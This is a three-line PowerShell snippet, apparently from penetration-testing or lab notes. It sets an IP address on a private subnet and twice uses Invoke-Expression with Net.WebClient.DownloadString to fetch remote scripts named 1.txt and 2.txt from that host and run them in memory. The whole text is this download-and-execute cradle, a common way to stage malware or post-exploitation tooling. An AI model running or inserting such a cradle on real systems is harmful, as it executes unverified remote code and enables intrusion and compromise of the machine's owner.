$ip = '192.168.45.198'
iex (New-Object Net.WebClient).DownloadString("http://$ip/1.txt")
iex (New-Object Net.WebClient).DownloadString("http://$ip/2.txt")
